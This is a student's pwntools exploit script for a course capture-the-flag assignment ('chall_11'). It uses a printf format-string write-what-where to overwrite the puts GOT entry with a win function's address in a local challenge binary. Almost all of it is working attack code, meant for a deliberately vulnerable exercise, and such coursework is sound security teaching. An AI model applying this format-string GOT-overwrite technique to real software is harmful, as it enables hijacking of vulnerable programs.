'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_11
File Description:  Classic write what where, need to see if win func

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   75) Symbols       No    0               2               chall_11

File info:
chall_11: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e15d478b7aa103299f0d72ceb37f9c0dac550cea, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Vulns:
    Only No PIE do I sense a leak coming on?!
    Ah yes a write what where, using printf to edit GOT entry?
    AH FOUND IT, overwrite PUTS, sinec called write after printf to call win fun
'''

# Import Libaries
from pwn import *

# Set up ELF
elf = ELF("./chall_11")

# Finding Offset (Found at ? with tons of %p)
offset = 7

# What to write, going to write address of win pretty much over GOT of puts
what = elf.sym.win

# Target == puts, since called after gets
target = elf.got.puts

# Start a process and send payload
p = process("./chall_11")
payload = fmtstr_payload(offset,{target:what})
p.sendline(payload)

# Recieve up till nulls to send line
null = payload.find(b'\x00')
p.recvuntil(payload[null-3:null])   # Catch all nulls

p.interactive()